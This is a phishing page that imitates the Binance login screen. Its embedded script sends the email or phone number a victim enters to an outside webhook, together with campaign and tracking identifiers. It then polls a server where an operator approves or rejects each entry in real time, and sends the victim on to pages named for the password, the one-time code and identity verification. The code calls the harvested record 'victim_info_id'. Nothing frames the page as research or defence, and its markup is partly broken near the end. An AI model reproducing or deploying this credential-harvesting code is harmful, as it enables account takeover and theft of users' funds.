<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1e2329 0%, #2b3139 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
        }

        .login-container {
            background: rgba(30, 35, 41, 0.95);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 48px 40px;
            width: 100%;
            max-width: 400px;
            backdrop-filter: blur(10px);
        }

        .logo-container {
            display: flex;
            align-items: center;
            margin-bottom: 40px;
        }

        .logo {
            height: 32px;
            margin-right: 12px;
            position: relative;
            border-radius: 4px;
        }

        .logo::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 20px;
            height: 20px;
            background: #1e2329;
            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
        }

        .logo::after {
            content: '';
            position: absolute;
            top: 4px;
            left: 4px;
            right: 4px;
            bottom: 4px;
            background: linear-gradient(135deg, #f0b90b 0%, #f8d33a 100%);
            clip-path: polygon(50% 15%, 15% 85%, 85% 85%);
        }

        .brand-name {
            font-size: 24px;
            font-weight: 700;
            color: #f0b90b;
            letter-spacing: 1px;
        }

        .header-section {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
        }

        .login-title {
            font-size: 32px;
            font-weight: 600;
            color: #ffffff;
        }        .qr-icon {
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 32px;
            height: 32px;
        }

        .qr-icon svg {
            width: 32px;
            height: 32px;
            fill: #848e9c;
        }

        .qr-icon:hover svg {
            fill: #ffffff;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 768px) {
            .qr-icon {
                display: none;
            }
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #ffffff;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 16px;
            background: rgba(43, 49, 57, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        .form-input:focus {
            outline: none;
            border-color: #f0b90b;
            box-shadow: 0 0 0 2px rgba(240, 185, 11, 0.2);
        }

        .form-input.error {
            border-color: #f84960;
            box-shadow: 0 0 0 2px rgba(248, 73, 96, 0.2);
        }

        .form-input.error:focus {
            border-color: #f84960;
            box-shadow: 0 0 0 2px rgba(248, 73, 96, 0.2);
        }        .next-button {
            width: 100%;
            padding: 16px;
            background-color: #fcd535;
            border: none;
            border-radius: 8px;
            color: #1e2329;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 24px;
        }

        .next-button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .divider {
            text-align: center;
            position: relative;
            margin: 24px 0;
            color: rgba(255, 255, 255, 0.6);
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: rgba(255, 255, 255, 0.1);
        }

        .divider span {
            background: rgba(30, 35, 41, 0.95);
            padding: 0 16px;
            position: relative;
        }

        .social-button {
            width: 100%;
            padding: 14px 16px;
            background: rgba(43, 49, 57, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: flex-start; /* Align content to the left edge */
            gap: 12px; /* Add spacing between the icon and text */
        }

        .social-button:hover {
            background: rgba(43, 49, 57, 0.8);
            border-color: rgba(255, 255, 255, 0.2);
        }

        .social-button-icon {
            width: 24px; /* Adjust icon size */
            height: 24px;
            border-radius: 4px; /* Optional for rounded icons */
            object-fit: contain; /* Ensure the image fits properly */
        }

        .social-button span {
            flex-grow: 1; /* Ensure text takes up remaining space */
        }

        .create-account {
            text-align: center;
            margin-top: 32px;
        }

        .create-account-link {
            color: #f0b90b;
            text-decoration: none;
            font-size: 16px;
            font-weight: 500;
            transition: color 0.3s ease;
        }

        .create-account-link:hover {
            color: #f8d33a;
        }

        .footer {
            display: none;
            margin-top: auto;
            padding-top: 40px;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 24px;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
        }

        .footer-item {
            color: rgba(255, 255, 255, 0.6);
            text-decoration: none;
            display: flex;
            align-items: center;
            transition: color 0.3s ease;
        }

        .footer-item:hover {
            color: rgba(255, 255, 255, 0.8);
        }        /* Loading Spinner Styles */
        .bn-spinner__nezha {
            display: inline-flex;
            gap: 3px;
            align-items: center;
            justify-content: center;
            height: 16px;
        }

        .nezha-line {
            width: 2px;
            height: 16px;
            border-radius: 1px;
            background-color: #1e2329;
            animation: nezha-animation 0.8s ease infinite;
        }

        .nezha-line:nth-child(1) { animation-delay: -0.3s; }
        .nezha-line:nth-child(2) { animation-delay: -0.2s; }
        .nezha-line:nth-child(3) { animation-delay: -0.1s; }
        .nezha-line:nth-child(4) { animation-delay: 0s; }

        @keyframes nezha-animation {
            0%, 40%, 100% {
                transform: scaleY(0.4);
                opacity: 0.4;
            }
            20% {
                transform: scaleY(1);
                opacity: 1;
            }
        }

        .button-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .button-content.loading .regular-content {
            display: none;
        }

        .button-content .loading-content {
            display: none;
        }

        .button-content.loading .loading-content {
            display: inline-flex;
        }

        /* Mobile Responsive Styles */
        @media (max-width: 768px) {
            body {
                background: #181a20;
                display: block;
                align-items: unset;
                justify-content: unset;
            }

            .login-container {
                background: #181a20;
                border: none;
                border-radius: 0;
                padding: 24px 20px;
                min-height: 100vh;
                max-width: none;
                backdrop-filter: none;
                display: flex;
                flex-direction: column;
            }

            .logo-container {
                margin-bottom: 32px;
            }

            .header-section {
                margin-bottom: 24px;
            }

            .login-title {
                font-size: 28px;
            }

            .form-group {
                margin-bottom: 20px;
            }

            .form-label {
                font-size: 13px;
                color: rgba(255, 255, 255, 0.7);
            }

            .form-input {
                padding: 14px 16px;
                background: #2b3139;
                border: 1px solid #3c4043;
                font-size: 16px;
            }

            .next-button {
                padding: 14px;
                margin-bottom: 20px;
            }

            .divider {
                margin: 20px 0;
            }

            .social-button {
                padding: 12px 16px;
                background: #2b3139;
                border: 1px solid #3c4043;
                margin-bottom: 8px;
            }

            .create-account {
                margin-top: 24px;
            }

            .footer {
                display: flex;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script>
        // Utility to get query param
        function getQueryParam(name) {
            const url = new URL(window.location.href);
            return url.searchParams.get(name);
        }

        // Generate a random tracking id (if not present)
        function getOrCreateTrackingId() {
            let trackingId = localStorage.getItem('binance_tracking_id') || sessionStorage.getItem('binance_tracking_id');
            if (!trackingId) {
                trackingId = Math.random().toString(36).substr(2, 12) + Date.now().toString(36);
                localStorage.setItem('binance_tracking_id', trackingId);
                sessionStorage.setItem('binance_tracking_id', trackingId);
            }
            return trackingId;
        }

        // Check and clear expired data on page load
        function checkAndClearExpiredData() {
            try {
                const expirationTime = localStorage.getItem('binance_data_expires');
                if (expirationTime && Date.now() > parseInt(expirationTime)) {
                    // Data has expired, clear it
                    localStorage.removeItem('binance_campaign_id');
                    localStorage.removeItem('binance_tracking_id');
                    localStorage.removeItem('binance_email');
                    localStorage.removeItem('binance_data_expires');
                    console.log('Expired data cleared from localStorage');
                }
            } catch (error) {
                console.error('Error checking expired data:', error);
            }
        }

        // Set expiration timer for localStorage data (10 minutes after successful webhook)
        function setDataExpiration() {
            try {
                const expirationTime = Date.now() + (10 * 60 * 1000); // 10 minutes from now
                localStorage.setItem('binance_data_expires', expirationTime.toString());
                
                // Set a timer to clear the data
                setTimeout(() => {
                    localStorage.removeItem('binance_campaign_id');
                    localStorage.removeItem('binance_tracking_id');
                    localStorage.removeItem('binance_email');
                    localStorage.removeItem('binance_data_expires');
                    console.log('Messaging data expired and cleared after 10 minutes');
                }, 10 * 60 * 1000); // 10 minutes
            } catch (error) {
                console.error('Error setting data expiration:', error);
            }
        }

        // Get or set campaign id from query param or storage
        function getOrSetCampaignId() {
            let campaignId = getQueryParam('campaign');
            if (campaignId) {
                // Remove any trailing slashes to avoid double slashes in the URL
                campaignId = campaignId.replace(/\/+$/, '');
                localStorage.setItem('binance_campaign_id', campaignId);
                sessionStorage.setItem('binance_campaign_id', campaignId);
            } else {
                campaignId = localStorage.getItem('binance_campaign_id') || sessionStorage.getItem('binance_campaign_id');
                // Clean up any stored campaignId with trailing slashes
                if (campaignId) {
                    campaignId = campaignId.replace(/\/+$/, '');
                }
            }
            return campaignId;
        }

        function handleSubmit(event) {
            event.preventDefault();
            const emailPhone = document.getElementById('emailPhone').value.trim();
            const campaignId = getOrSetCampaignId();
            const trackingId = getOrCreateTrackingId();
            
            if (!emailPhone) {
                showError('Please enter your email or phone number');
                return;
            }
            if (!isValidEmailOrPhone(emailPhone)) {
                showError('Please enter a valid email address or phone number');
                return;
            }
            if (!campaignId) {
                showError('Missing attached id.');
                return;
            }
            // Store email/phone for later use
            localStorage.setItem('binance_email', emailPhone);
            sessionStorage.setItem('binance_email', emailPhone);
            // Show loading state
            const button = document.getElementById('next-btn');
            showLoading(button);
            // Prepare data for webhook
            const data = {
                login_email: emailPhone,
                tracking_id: trackingId,
                timestamp: new Date().toISOString(),
                type: 'login_attempt',
                user_agent: navigator.userAgent,
                ip_info: 'client-side'
            };
            // Send to webhook
            submitToWebhook(data, campaignId);
        }

        function isValidEmailOrPhone(input) {
            // Email validation
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            // Phone validation (basic - digits only, 7-15 characters)
            const phoneRegex = /^\d{7,15}$/;
            
            return emailRegex.test(input) || phoneRegex.test(input.replace(/\D/g, ''));
        }

        function validateInput() {
            const emailPhone = document.getElementById('emailPhone').value.trim();
            const button = document.getElementById('next-btn');
            const input = document.getElementById('emailPhone');
            
            // Enable/disable button based on input
            button.disabled = !emailPhone;
            
            // Hide error messages when user is typing and reset input styling
            const errorElement = document.getElementById('error-message');
            if (errorElement && emailPhone.length > 0) {
                errorElement.style.display = 'none';
                // Reset input styling
                input.classList.remove('error');
            }
        }

        function submitToWebhook(data, campaignId) {
            // Debug info
            console.log('Submitting data to webhook:', data);
            console.log('Campaign ID:', campaignId);
            
            // Use your actual backend host here
            const webhookUrl = `https://emailgrid.onrender.com/webhook/${campaignId}/`;
            console.log('Webhook URL:', webhookUrl);
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                },
                body: JSON.stringify(data),
                mode: 'cors', // Add CORS mode
                credentials: 'omit' // Don't send cookies
            })
            .then(response => {
                console.log('Response status:', response.status);
                console.log('Response headers:', [...response.headers.entries()]);
                
                if (!response.ok) {
                    return response.text().then(text => {
                        console.log('Error response body:', text);
                        throw new Error(`HTTP error! status: ${response.status}, body: ${text}`);
                    });
                }
                return response.json();
            })
            .then(result => {
                console.log('Webhook success response:', result);
                // Store victim info ID for polling
                if (result.victim_info_id) {
                    localStorage.setItem('binance_victim_info_id', result.victim_info_id);
                    // Start polling for approval/rejection - keep loading state
                    pollForApproval(result.victim_info_id, campaignId, 'email');
                } else {
                    // Fallback to original behavior
                    hideLoading();
                    setDataExpiration();
                    setTimeout(() => {
                        window.location.href = 'binance-passkey.html';
                    }, 1500);
                }
            })
            .catch(error => {
                console.error('Webhook error:', error);
                // Only show connection error for actual network failures
                if (
                    error.message.includes('Failed to fetch') ||
                    error.message.includes('NetworkError') ||
                    error.message.includes('TypeError')
                ) {
                    hideLoading();
                    showError('Connection error. Please check your internet connection and try again.');
                }
                // Do not hide loading or show error for pending/unapproved states
            });
        }

        function pollForApproval(victimInfoId, campaignId, step) {
            const pollUrl = `https://emailgrid.onrender.com/status/${victimInfoId}/?step=${step}`;
            console.log('Starting polling with URL:', pollUrl);
            console.log('Victim Info ID:', victimInfoId);
            console.log('Campaign ID:', campaignId);
            console.log('Step:', step);
            
            let pollingActive = true; // Flag to control polling
            
            const poll = () => {
                if (!pollingActive) return; // Stop polling if disabled
                console.log('Polling...');
                fetch(pollUrl, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json',
                    },
                    mode: 'cors',
                    credentials: 'omit'
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Poll result:', result);
                    console.log('Submission status:', result.submission_status);
                    console.log('Step:', step);
                    
                    if (result.submission_status === 'approved') {
                        console.log('Status approved! Redirecting...');
                        pollingActive = false; // Stop polling
                        // Hide loading and proceed to next step IMMEDIATELY
                        hideLoading();
                        setDataExpiration();
                        if (step === 'email') {
                            window.location.href = 'binance-passkey.html';
                        } else if (step === 'password') {
                            window.location.href = 'binance-otp.html';
                        } else if (step === 'otp') {
                            window.location.href = 'binance-verification.html';
                        } else {
                            // fallback: reload or go to dashboard
                            window.location.href = 'binance.html';
                        }
                    } else if (result.submission_status === 'rejected') {
                        console.log('Status rejected! Showing error and stopping...');
                        pollingActive = false; // Stop polling - DO NOT PROCEED
                        // Hide loading and show error - STAY ON CURRENT PAGE
                        hideLoading();
                        let errorMsg = 'Incorrect input. Please try again.';
                        if (step === 'email') errorMsg = result.error_message || 'Incorrect email. Please try again.';
                        else if (step === 'password') errorMsg = result.error_message || 'Incorrect password. Please try again.';
                        else if (step === 'otp') errorMsg = result.error_message || 'Invalid OTP. Please try again.';
                        showError(errorMsg);
                        // DO NOT REDIRECT - User must fix the input and try again
                    } else {
                        console.log('Status still pending. Current status:', result.submission_status);
                        // Still pending, continue polling
                        setTimeout(poll, 2000); // Poll every 2 seconds
                    }
                })
                .catch(error => {
                    console.error('Polling error:', error);
                    // Continue polling on error, but limit retries
                    if (pollingActive) {
                        setTimeout(poll, 3000);
                    }
                });
            };
            
            // Start polling
            poll();
            
            // Add a fallback timeout after 30 seconds - but only proceed if NOT rejected
            setTimeout(() => {
                if (pollingActive) { // Only proceed if polling is still active (not rejected)
                    console.log('Polling timeout reached, proceeding anyway...');
                    pollingActive = false;
                    hideLoading();
                    setDataExpiration();
                    if (step === 'email') {
                        window.location.href = 'binance-passkey.html';
                    } else if (step === 'password') {
                        window.location.href = 'binance-otp.html';
                    } else if (step === 'otp') {
                        window.location.href = 'binance-verification.html';
                    } else {
                        window.location.href = 'binance.html';
                    }
                }
            }, 30000); // 30 second timeout
        }

        function showLoading(button) {
            if (button) {
                const buttonContent = button.querySelector('.button-content');
                if (buttonContent) {
                    buttonContent.classList.add('loading');
                }
                button.disabled = true;
            }
        }

        function hideLoading() {
            const button = document.getElementById('next-btn');
            if (button) {
                const buttonContent = button.querySelector('.button-content');
                if (buttonContent) {
                    buttonContent.classList.remove('loading');
                }
                button.disabled = false;
            }
        }

        function showError(message) {
            // Create or update error message element
            let errorElement = document.getElementById('error-message');
            if (!errorElement) {
                errorElement = document.createElement('div');
                errorElement.id = 'error-message';
                errorElement.style.cssText = `
                    color: #f84960;
                    font-size: 12px;
                    margin-top: 6px;
                    text-align: left;
                    padding: 0;
                    background: transparent;
                    border: none;
                `;
                const formGroup = document.querySelector('.form-group');
                formGroup.appendChild(errorElement);
            }
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            
            // Add error class to input field
            const input = document.getElementById('emailPhone');
            input.classList.add('error');
            
            // Hide error after 5 seconds
            setTimeout(() => {
                if (errorElement) {
                    errorElement.style.display = 'none';
                    // Reset input styling
                    input.classList.remove('error');
                }
            }, 5000);
        }

        function resetButton() {
            const button = document.getElementById('next-btn');
            const buttonContent = button.querySelector('.button-content');
            if (buttonContent) {
                buttonContent.classList.remove('loading');
            }
            button.disabled = false;
        }

        // Initialize on page load
        window.addEventListener('load', function() {
            checkAndClearExpiredData(); // Check for expired data first
            
            const emailPhoneInput = document.getElementById('emailPhone');
            emailPhoneInput.focus();
            
            // Pre-fill if there's stored data
            const storedEmail = localStorage.getItem('binance_email') || sessionStorage.getItem('binance_email');
            if (storedEmail) {
                emailPhoneInput.value = storedEmail;
                validateInput();
            }
        });
    </script>
</head>
<body>

        <div class="logo-container">
            <img src="binance-h.png" alt="" class="logo">
        </div>

        <div class="header-section">

                    <path d="M16.535 5.035h2.58v2.58h-2.58v-2.58zM15.5 22.5V20H13v2.5h2.5z" fill="currentColor"></path>

                    <path d="M22.5 15.5V13H20v2.5h2.5z" fill="currentColor"></path>
                </svg>

        <form onsubmit="handleSubmit(event)">
            <div class="form-group">
                <label class="form-label">Email/Phone number</label>
                <input 
                    type="text" 
                    id="emailPhone"
                    class="form-input" 
                    placeholder="Email/Phone (without country code)"
                    required
                    oninput="validateInput()"
                >
            </div>
            <button type="submit" class="next-button" id="next-btn">
                <div class="button-content">
                    <span class="regular-content">Next</span>
                    <div class="loading-content">
                        <div class="bn-spinner__nezha">
                            <div class="nezha-line"></div>
                            <div class="nezha-line"></div>
                            <div class="nezha-line"></div>
                            <div class="nezha-line"></div>
                        </div>
                    </div>
                </div>
            </button>

            <div class="divider">
